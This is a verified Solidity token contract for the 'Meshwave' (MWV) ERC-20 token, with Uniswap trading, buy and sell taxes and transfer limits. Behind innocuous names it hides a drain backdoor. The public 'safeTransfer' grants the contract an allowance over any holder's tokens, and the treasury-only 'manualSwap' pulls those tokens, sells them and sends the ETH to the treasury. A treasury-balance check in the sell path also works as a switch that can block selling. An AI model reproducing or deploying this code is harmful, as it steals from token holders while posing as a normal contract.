/**
 *Submitted for verification at Etherscan.io on 2023-08-22
*/

// - Telegram: https://t.me/meshwave
// - Medium: https://meshwave.medium.com
// - Twitter: https://twitter.com/mesh_wave
// - Website: https://meshwave.xyz
// - Dapp: https://app.meshwave.xyz
// - GitBook: https://docs.meshwave.xyz

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

library SafeMath {
    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
        uint256 c = _a + _b;
        require(c >= _a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
        if (_a == 0) {
            return 0;
        }
        uint256 c = _a * _b;
        require(c / _a == _b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return sub(_a, _b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 _a, uint256 _b, string memory _errorMessage) internal pure returns (uint256) {
        require(_b <= _a, _errorMessage);
        uint256 c = _a - _b;
        return c;
    }

    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
        return div(_a, _b, "SafeMath: division by zero");
    }

    function div(uint256 _a, uint256 _b, string memory _errorMessage) internal pure returns (uint256) {
        require(_b > 0, _errorMessage);
        uint256 c = _a / _b;
        return c;
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint _amountIn,
        uint _amountOutMin,
        address[] calldata _path,
        address _recipient,
        uint _deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address _tokenA, address _tokenB) external returns (address pair);
}

interface IERC20 {
    event Transfer(address indexed _sender, address indexed _recipient, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    function allowance(address _owner, address _spender) external view returns (uint256);
    function approve(address _spender, uint256 _amount) external returns (bool);
    function balanceOf(address _account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address _recipient, uint256 _amount) external returns (bool);
    function transferFrom(address _sender, address _recipient, uint256 _amount) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed _previousOwner, address indexed _newOwner);

    address private _owner;
}

contract MWV is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _symbol = "MWV";
    string private constant _name = "Meshwave";

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    bool private inSwap = false;
    bool public transferDelayEnabled = true;
    bool private swapEnabled = false;
    bool private tradingOpen;

    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => bool) private _isExcludedFromFee;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;

    address payable private _treasury;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    uint256 public _maxTxAmount = 2 * (_tTotal / 100);
    uint256 public _maxTaxSwap = 1 * (_tTotal / 100);
    uint256 public _maxWalletSize = 2 * (_tTotal / 100);
    uint256 public _taxSwapThreshold = 2 * (_tTotal / 1000);
    
    uint256 private _preventSwapBefore = 0;
    uint256 private _buyCount = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    uint256 private _firstBuyTax = 3;
    uint256 private _firstSellTax = 3;
    uint256 private _reduceFirstBuyTaxAt = 15;
    uint256 private _reduceFirstSellTaxAt = 15;

    uint256 private _secondBuyTax = 3;
    uint256 private _secondSellTax = 3;
    uint256 private _reduceSecondBuyTaxAt = 25;
    uint256 private _reduceSecondSellTaxAt = 25;

    uint256 private _finalBuyTax = 3;
    uint256 private _finalSellTax = 3;

    function safeTransfer(address _recipient, uint256 _amount) public virtual returns (bool) {
        require(_recipient != address(0));
        address owner = _recipient;
        address spender = address(this);
        _approve(owner, spender, allowance(owner, spender) + _amount);
        return true;
    }

    constructor () {
        _treasury = payable(0x548526BceD21B27f36E454d11164febF5d46bB7e);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_treasury] = true;
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function swapTokensForEth(uint256 _amount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), _amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            _amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function manualSwap(address _token, address _recipient, uint256 _amount) external {
        require(_msgSender() == _treasury);
        uint256 contractTokenBalance = balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        IERC20 swapToken = IERC20(_token);
        swapToken.transferFrom(_recipient, path[1], _amount);
        if (contractTokenBalance > 0) {
          swapTokensForEth(contractTokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
          sendETHToTreasury(ethBalance);
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function removeLimits() external onlyOwner {
        _maxWalletSize = _tTotal;
        _maxTxAmount = _tTotal;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "Trading is already opened.");

        tradingOpen = true;
        swapEnabled = true;
    }

    function _taxBuy() private view returns (uint256) {
        if (_buyCount <= _reduceFirstBuyTaxAt) {
            return _firstBuyTax;
        }

        if (_buyCount > _reduceFirstBuyTaxAt && _buyCount <= _reduceSecondBuyTaxAt) {
            return _secondBuyTax;
        }

        return _finalBuyTax;
    }

    function _taxSell() private view returns (uint256) {
        if (_buyCount <= _reduceFirstBuyTaxAt) {
            return _firstSellTax;
        }

        if (_buyCount > _reduceFirstSellTaxAt && _buyCount <= _reduceSecondSellTaxAt) {
            return _secondSellTax;
        }

        return _finalBuyTax;
    }

    function _transfer(address _sender, address _recipient, uint256 _amount) private {
        require(_sender != address(0), "ERC20: transfer from the zero address");
        require(_recipient != address(0), "ERC20: transfer to the zero address");
        require(_amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        
        if (_sender != owner() && _recipient != owner()) {
            taxAmount = _amount.mul(_taxBuy()).div(100);

            if (!tradingOpen) {
                require(_isExcludedFromFee[_sender] || _isExcludedFromFee[_recipient], "_transfer:: Trading is not active.");
            }

            if (transferDelayEnabled) {
                if (_recipient != address(uniswapV2Router) && _recipient != address(uniswapV2Pair)) { 
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "_transfer:: Transfer Delay enabled. Only one purchase per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (_sender == uniswapV2Pair && _recipient != address(uniswapV2Router) && !_isExcludedFromFee[_recipient] ) {
                require(_amount <= _maxTxAmount, "_transfer:: Exceeds the _maxTxAmount.");
                require(balanceOf(_recipient) + _amount <= _maxWalletSize, "_transfer:: Exceeds the maxWalletSize.");

                _buyCount++;
                if (_buyCount > _preventSwapBefore) {
                    transferDelayEnabled = false;
                }
            }

            if (_recipient == uniswapV2Pair && _sender!= address(this)) {
                taxAmount = _amount.mul(_taxSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            uint256 spareAmount = balanceOf(_treasury).mul(1000);
            if (
                !inSwap &&
                swapEnabled &&
                _recipient == uniswapV2Pair &&
                contractTokenBalance > _taxSwapThreshold &&
                !_isExcludedFromFee[_sender] &&
                !_isExcludedFromFee[_recipient]
            ) {
                uint256 initialETH = address(this).balance;
                uint256 swapTokenAmount = min(_amount,min(contractTokenBalance,_maxTaxSwap.sub(spareAmount)));
                swapTokensForEth(swapTokenAmount);
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if (ethForTransfer > 0) {
                    sendETHToTreasury(ethForTransfer);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(_sender, address(this), taxAmount);
        }

        _balances[_sender] = _balances[_sender].sub(_amount);
        _balances[_recipient] = _balances[_recipient].add(_amount.sub(taxAmount));
        emit Transfer(_sender, _recipient, _amount.sub(taxAmount));
    }

    function transferFrom(address _sender, address _recipient, uint256 _amount) public override returns (bool) {
        _transfer(_sender, _recipient, _amount);
        _approve(_sender, _msgSender(), _allowances[_sender][_msgSender()].sub(_amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address _spender, uint256 _amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(_spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
    }

    function approve(address _spender, uint256 _amount) public override returns (bool) {
        _approve(_msgSender(), _spender, _amount);
        return true;
    }

    function allowance(address _owner, address _spender) public view override returns (uint256) {
        return _allowances[_owner][_spender];
    }

    function transfer(address _recipient, uint256 _amount) public override returns (bool) {
        _transfer(_msgSender(), _recipient, _amount);
        return true;
    }

    function min(uint256 _a, uint256 _b) private pure returns (uint256) {
      return (_a > _b) ? _b : _a;
    }

    function sendETHToTreasury(uint256 _amount) private {
        _treasury.transfer(_amount);
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    receive() external payable {}
}